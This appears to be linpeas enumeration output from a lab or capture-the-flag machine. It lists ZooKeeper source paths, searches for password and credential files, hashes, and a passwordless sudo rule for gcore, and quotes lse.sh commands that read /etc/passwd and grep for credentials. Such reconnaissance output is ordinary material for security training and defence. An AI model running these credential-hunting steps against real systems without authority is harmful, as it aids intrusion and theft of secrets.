+/opt/zookeeper/src/c/autom4te.cache/output.3
+/opt/zookeeper/src/c/autom4te.cache/traces.1
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/c/generated/zookeeper.jute.c
+/opt/zookeeper/src/c/generated/zookeeper.jute.h
+/opt/zookeeper/src/c/NOTICE.txt
+/opt/zookeeper/src/c/acinclude.m4
+/opt/zookeeper/src/c/configure.ac
+/opt/zookeeper/src/c/aminclude.am
+/opt/zookeeper/src/c/LICENSE
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/lastRevision.bat
+/opt/zookeeper/src/contrib/zooinspector/licences/Apache Software Licence v2.0.txt
+/opt/zookeeper/src/contrib/zooinspector/licences/epl-v10.html
+/opt/zookeeper/src/contrib/zooinspector/build.xml
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/ZooInspector.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/manager/Pair.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorManagerImpl.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/manager/NodeListener.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorManager.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/manager/ZooInspectorNodeTreeManager.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/logger/LoggerFactory.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/encryption/DataEncryptionManager.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/encryption/BasicDataEncryptionManager.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/about.html
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/ZooInspectorNodeViewer.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerData.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerMetaData.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/nodeviewer/NodeViewerACL.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorPanel.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorConnectionPropertiesDialog.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/NodeViewersChangeListener.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorTreeViewer.java
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/inspector/gui/ZooInspectorIconResources.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zooinspector/src/java/org/apache/zookeeper/retry/ZooKeeperRetry.java
+/opt/zookeeper/src/contrib/zooinspector/config/defaultConnectionSettings.cfg
+/opt/zookeeper/src/contrib/zooinspector/config/defaultNodeVeiwers.cfg
+/opt/zookeeper/src/contrib/zooinspector/lib/jtoaster-1.0.4.jar
+/opt/zookeeper/src/contrib/zooinspector/lib/log4j.properties
+/opt/zookeeper/src/contrib/zooinspector/NOTICE.txt
+/opt/zookeeper/src/contrib/zooinspector/zooInspector.cmd
+/opt/zookeeper/src/contrib/zooinspector/ivy.xml
+/opt/zookeeper/src/contrib/zooinspector/README.txt
+/opt/zookeeper/src/contrib/build.xml
+/opt/zookeeper/src/contrib/zktreeutil/tests/zk_sample.xml
+/opt/zookeeper/src/contrib/zktreeutil/build.xml
+/opt/zookeeper/src/contrib/zktreeutil/src/ZkAdaptor.cc
+/opt/zookeeper/src/contrib/zktreeutil/src/Makefile.am
+/opt/zookeeper/src/contrib/zktreeutil/src/ZkTreeUtil.cc
+/opt/zookeeper/src/contrib/zktreeutil/src/ZkTreeUtil.h
+/opt/zookeeper/src/contrib/zktreeutil/src/ZkAdaptor.h
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zktreeutil/Makefile.am
+/opt/zookeeper/src/contrib/zktreeutil/configure.ac
+/opt/zookeeper/src/contrib/zktreeutil/README.txt
+/opt/zookeeper/src/contrib/monitoring/README
+/opt/zookeeper/src/contrib/monitoring/check_zookeeper.py
+/opt/zookeeper/src/contrib/monitoring/test.py
+/opt/zookeeper/src/contrib/monitoring/ganglia/README
+/opt/zookeeper/src/contrib/monitoring/ganglia/modpython.conf
+/opt/zookeeper/src/contrib/monitoring/ganglia/zookeeper.pyconf
+/opt/zookeeper/src/contrib/monitoring/ganglia/zookeeper_ganglia.py
+/opt/zookeeper/src/contrib/monitoring/JMX-RESOURCES
+/opt/zookeeper/src/contrib/monitoring/cacti/README
+/opt/zookeeper/src/contrib/monitoring/nagios/hostgroups.cfg
+/opt/zookeeper/src/contrib/monitoring/nagios/services.cfg
+/opt/zookeeper/src/contrib/monitoring/nagios/zookeeper.cfg
+/opt/zookeeper/src/contrib/monitoring/nagios/README.txt
+/opt/zookeeper/src/contrib/build-contrib.xml
+/opt/zookeeper/src/contrib/zkfuse/build.xml
+/opt/zookeeper/src/contrib/zkfuse/src/log.cc
+/opt/zookeeper/src/contrib/zkfuse/src/doxygen.cfg
+/opt/zookeeper/src/contrib/zkfuse/src/log.h
+/opt/zookeeper/src/contrib/zkfuse/src/event.h
+/opt/zookeeper/src/contrib/zkfuse/src/mutex.h
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zkfuse/Makefile.am
+/opt/zookeeper/src/contrib/zkfuse/configure.ac
+/opt/zookeeper/src/contrib/zkfuse/README.txt
+/opt/zookeeper/src/contrib/zkpython/README
+/opt/zookeeper/src/contrib/zkpython/build.xml
+/opt/zookeeper/src/contrib/zkpython/src/c/pyzk_docstrings.h
+/opt/zookeeper/src/contrib/zkpython/src/c/zookeeper.c
+/opt/zookeeper/src/contrib/zkpython/src/python/zk.py
+/opt/zookeeper/src/contrib/zkpython/src/python/setup.py
+/opt/zookeeper/src/contrib/zkpython/src/packages/rpm/spec/zkpython.spec
+/opt/zookeeper/src/contrib/zkpython/src/packages/deb/zkpython.control/control
+/opt/zookeeper/src/contrib/zkpython/src/test/clientid_test.py
+/opt/zookeeper/src/contrib/zkpython/src/test/get_set_test.py
+/opt/zookeeper/src/contrib/zkpython/src/test/exists_test.py
+/opt/zookeeper/src/contrib/zkpython/src/test/zktestbase.py
+/opt/zookeeper/src/contrib/zkpython/src/test/async_test.py
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zkpython/src/examples/README
+/opt/zookeeper/src/contrib/zkpython/src/examples/watch_znode_for_changes.py
+/opt/zookeeper/src/contrib/zkpython/ivy.xml
+/opt/zookeeper/src/contrib/zkperl/README
+/opt/zookeeper/src/contrib/zkperl/t/45_class.t
+/opt/zookeeper/src/contrib/zkperl/t/util.pl
+/opt/zookeeper/src/contrib/zkperl/t/50_access.t
+/opt/zookeeper/src/contrib/zkperl/t/15_thread.t
+/opt/zookeeper/src/contrib/zkperl/t/24_watch_tie.t
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/zkperl/Changes
+/opt/zookeeper/src/contrib/zkperl/build.xml
+/opt/zookeeper/src/contrib/zkperl/MANIFEST
+/opt/zookeeper/src/contrib/zkperl/typemap
+/opt/zookeeper/src/contrib/zkperl/build/check_zk_version.h
+/opt/zookeeper/src/contrib/zkperl/build/check_zk_version.c
+/opt/zookeeper/src/contrib/zkperl/Makefile.PL
+/opt/zookeeper/src/contrib/zkperl/LICENSE
+/opt/zookeeper/src/contrib/zkperl/NOTICE
+/opt/zookeeper/src/contrib/zkperl/ZooKeeper.pm
+/opt/zookeeper/src/contrib/zkperl/ZooKeeper.xs
+/opt/zookeeper/src/contrib/huebrowser/README
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/stats.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/urls.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/windmilltests.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/models.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/forms.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/static/js/package.yml
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/static/js/Source/Zkui/Zkui.js
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/static/help/index.html
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/static/bootstrap.js
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/static/css/zkui.css
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/__init__.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/settings.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/rest.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/utils.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/views.py
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/templates/edit.mako
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/templates/clients.mako
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/templates/index.mako
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/templates/shared_components.mako
+/opt/zookeeper/src/contrib/huebrowser/zkui/src/zkui/templates/create.mako
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/huebrowser/zkui/Makefile
+/opt/zookeeper/src/contrib/huebrowser/zkui/setup.py
+/opt/zookeeper/src/contrib/fatjar/build.xml
+/opt/zookeeper/src/contrib/fatjar/src/java/org/apache/zookeeper/util/FatJarMain.java
+/opt/zookeeper/src/contrib/fatjar/conf/mainClasses
+/opt/zookeeper/src/contrib/fatjar/README.txt
+/opt/zookeeper/src/contrib/rest/build.xml
+/opt/zookeeper/src/contrib/rest/src/python/demo_queue.py
+/opt/zookeeper/src/contrib/rest/src/python/zk_dump_tree.py
+/opt/zookeeper/src/contrib/rest/src/python/test.py
+/opt/zookeeper/src/contrib/rest/src/python/zkrest.py
+/opt/zookeeper/src/contrib/rest/src/python/demo_master_election.py
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/cfg/Credentials.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/cfg/HostPortSet.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/cfg/HostPort.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/cfg/RestCfg.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/cfg/Endpoint.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/jaxb/ZError.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/jaxb/ZChildren.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/jaxb/ZChildrenJSON.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/jaxb/ZPath.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/jaxb/ZSession.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/filters/HTTPBasicAuth.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/resources/ZNodeResource.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/resources/ZErrorWriter.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/resources/JAXBContextResolver.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/resources/KeeperExceptionMapper.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/resources/RuntimeExceptionMapper.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/RestMain.java
+/opt/zookeeper/src/contrib/rest/src/java/org/apache/zookeeper/server/jersey/ZooKeeperService.java
+/opt/zookeeper/src/contrib/rest/src/test/org/apache/zookeeper/server/jersey/DeleteTest.java
+/opt/zookeeper/src/contrib/rest/src/test/org/apache/zookeeper/server/jersey/Base.java
+/opt/zookeeper/src/contrib/rest/src/test/org/apache/zookeeper/server/jersey/RootTest.java
+/opt/zookeeper/src/contrib/rest/src/test/org/apache/zookeeper/server/jersey/WadlTest.java
+/opt/zookeeper/src/contrib/rest/src/test/org/apache/zookeeper/server/jersey/RestTestSuite.java
+#)You_can_write_even_more_files_inside_last_directory
+
+/opt/zookeeper/src/contrib/rest/NOTICE.txt
+/opt/zookeeper/src/contrib/rest/SPEC.txt
+/opt/zookeeper/src/contrib/rest/conf/log4j.properties
+/opt/zookeeper/src/contrib/rest/conf/rest.properties
+/opt/zookeeper/src/contrib/rest/conf/keys/README
+/opt/zookeeper/src/contrib/rest/conf/keys/rest.cer
+/opt/zookeeper/src/contrib/rest/conf/keys/rest.jks
+/opt/zookeeper/src/contrib/rest/ivy.xml
+/opt/zookeeper/src/contrib/rest/README.txt
+/opt/zookeeper/src/contrib/loggraph/build.xml
+/opt/zookeeper/src/contrib/loggraph/src/java/org/apache/zookeeper/graph/RandomAccessFileReader.java
+/opt/zookeeper/src/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/NumEvents.java
+/opt/zookeeper/src/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/GraphData.java
+/opt/zookeeper/src/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/FileLoader.java
+/opt/zookeeper/src/contrib/loggraph/src/java/org/apache/zookeeper/graph/servlets/Fs.java
+
+╔══════════╣ Searching passwords in config PHP files
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Finding IPs inside logs (limit 70)
+     42 192.168.49.248
+
+╔══════════╣ Finding passwords inside logs (limit 70)
+
+╔══════════╣ Finding emails inside logs (limit 70)
+
+╔══════════╣ Finding *password* or *credential* files in home (limit 70)
+/etc/pam.d/common-password
+/usr/bin/password-store
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/grub/i386-pc/legacy_password_test.mod
+/usr/lib/grub/i386-pc/password.mod
+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/libreoffice/program/libpasswordcontainerlo.so
+/usr/lib/libreoffice/share/config/soffice.cfg/cui/ui/password.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/dbaccess/ui/password.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/modules/scalc/ui/retypepassworddialog.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/sfx/ui/password.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/masterpassworddlg.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/password.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/uui/ui/setmasterpassworddlg.ui
+/usr/lib/libreoffice/share/config/soffice.cfg/vcl/ui/cupspassworddialog.ui
+/usr/lib/pppd/2.4.7/passwordfd.so
+/usr/lib/python2.7/dist-packages/samba/credentials.x86_64-linux-gnu.so
+/usr/lib/python2.7/dist-packages/samba/tests/credentials.py
+/usr/lib/python2.7/dist-packages/samba/tests/credentials.pyc
+/usr/lib/python2.7/dist-packages/samba/tests/krb5_credentials.py
+/usr/lib/python2.7/dist-packages/samba/tests/krb5_credentials.pyc
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/python2.7/dist-packages/samba/tests/samba_tool/passwordsettings.pyc
+/usr/lib/python2.7/dist-packages/samba/tests/samba_tool/provision_password_check.py
+/usr/lib/python2.7/dist-packages/samba/tests/samba_tool/provision_password_check.pyc
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-plymouth.path
+/usr/lib/systemd/system/systemd-ask-password-plymouth.service
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
+/usr/lib/x86_64-linux-gnu/mariadb19/plugin/mysql_clear_password.so
+/usr/lib/x86_64-linux-gnu/samba/ldb/local_password.so
+/usr/lib/x86_64-linux-gnu/samba/ldb/password_hash.so
+/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
+/usr/share/doc/p7zip/DOC/MANUAL/cmdline/switches/password.htm
+/usr/share/doc/tcllib/examples/transfer/certs/ca.key.password
+/usr/share/doc/xarchiver/images/password_dialog.png
+/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/bg/zenity/password.page
+/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/ca/zenity/password.page
+/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/cs/zenity/password.page
+/usr/share/help/C/zenity/figures/zenity-password-screenshot.png
+/usr/share/help/C/zenity/password.page
+
+╔══════════╣ Finding passwords inside key folders (limit 70) - only PHP files
+
+╔══════════╣ Finding passwords inside key folders (limit 70) - no PHP files
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:    global.password_dialogue = local;
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:        global.password_dialogue = NULL;
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:    global.password_dialogue.opacity = opacity;
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:            password_dialogue.bullets[index].sprite = Sprite ();
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:            password_dialogue.bullets[index].y = bullet_y;
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:            password_dialogue.bullets[index].z = password_dialogue.entry.z + 1;
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:    password_dot_filename = "password_dot.png";
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:#    password_dot_filename = "password_dot.png";
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:#    password_field_filename = "password_field16.png";
+/etc/alternatives/desktop-theme/plymouth/futureprototype.script:    password_field_filename = "password_field.png";
+/etc/debconf.conf:#BindPasswd: secret
+/etc/java-11-openjdk/management/management.properties:# com.sun.management.jmxremote.password.file=filepath
+/etc/java-11-openjdk/management/management.properties:# com.sun.management.jmxremote.password.toHashes = true|false
+/etc/java-11-openjdk/management/management.properties:#          javax.net.ssl.keyStorePassword=<keystore-password>
+/etc/java-11-openjdk/management/management.properties:#          javax.net.ssl.trustStorePassword=<truststore-password>
+/etc/nsswitch.conf:passwd:         files systemd
+/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure sha512
+/etc/profile.d/vte-2.91.sh:  [ "$PWD" != "$HOME" ] && pwd=${PWD/#$HOME\//\~\/}
+/etc/profile.d/vte-2.91.sh:  local pwd='~'
+/etc/samba/smb.conf:   pam password change = yes
+/etc/samba/smb.conf:   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
+/etc/samba/smb.conf:   passwd program = /usr/bin/passwd %u
+/etc/samba/smb.conf:   unix password sync = yes
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf:challengePassword          = A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max              = 20
+/etc/ssl/openssl.cnf:challengePassword_min              = 4
+/etc/ssl/openssl.cnf:# input_password = secret
+/etc/ssl/openssl.cnf:# output_password = secret
+/etc/sudoers.d/charles:charles ALL=(ALL) NOPASSWD:/usr/bin/gcore
+/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
+/home/charles/tmp/lse.sh:  cecho "${lblue}    Password:${reset} "
+/home/charles/tmp/lse.sh:    'for uh in $(cut -d: -f1,6 /etc/passwd); do [ -f "${uh##*:}/.sudo_as_admin_successful" ] && echo "${uh%%:*}"; done'
+/home/charles/tmp/lse.sh:    'for u in $(cut -d: -f1 /etc/passwd); do [ $(id -u $u) = 0 ] && echo $u; done | grep -v root'
+/home/charles/tmp/lse.sh:    'for u in $(cut -d: -f 1 /etc/passwd); do [ "$u" != "$lse_user" ] && crontab -l -u "$u"; done'
+/home/charles/tmp/lse.sh:    'grep $lse_grep_opts -Ei "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/home/charles/tmp/lse.sh:[ -z "$lse_home" ] && lse_home="`(grep -E "^$lse_user:" /etc/passwd | cut -d: -f6)2>/dev/null`"
+/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
+
+╔══════════╣ Finding possible password variables inside key folders (limit 140)
+
+╔══════════╣ Finding possible password in config files
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+ /etc/reportbug.conf
+password for SMTP
+passwd XXX
+ /etc/samba/smb.conf
+password with the SMB password when the encrypted SMB password in the
+password sync = yes
+password sync to work on a Debian GNU/Linux system, the following
+passwd program in Debian Sarge).
+passwd program = /usr/bin/passwd %u
+passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
+password changes
+passwd program'. The default is 'no'.
+password change = yes
+password; please adapt to your needs
+password --gecos "" %u
+ /etc/adduser.conf
+passwd
+ /etc/nsswitch.conf
+passwd:         files systemd
+
+╔══════════╣ Finding 'username' string inside key folders (limit 70)
+/home/charles/tmp/lse.sh:    'grep $lse_grep_opts -Ei "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+
+╔══════════╣ Searching specific hashes inside files - less false positives (limit 70)
+
+╔══════════╣ Searching md5/sha1/sha256/sha512 hashes inside files (limit 50 - only 1 per file)
+/etc/java-11-openjdk/security/blacklisted.certs:14E6D2764A4B06701C6CBC376A253775F79C782FBCB6C0EE6F99DE4BA1024ADD
+/etc/java-11-openjdk/security/java.security: AC2B922ECFD5E01711772FEA8ED372DE9D1E2245FCE3F57A9CDBEC77296A424B
+/etc/machine-id:1273fbc074d84437b6aebedf10b61b25
+/etc/grub.d/05_debian_theme:648ee65dd0c157a69b019a5372cbcfea4fc754a5
+/var/backups/dpkg.status.0: 773fb95e98a27947de4a95abb3d3f2a2
+/home/charles/local.txt:c03e548caed51d2245da0e0095ee6dd9
+/home/charles/tmp/linpeas.txt:=994484f1718c4329aaf69e636370a918
+
+╔══════════╣ Finding URIs with user:password@host inside key folders
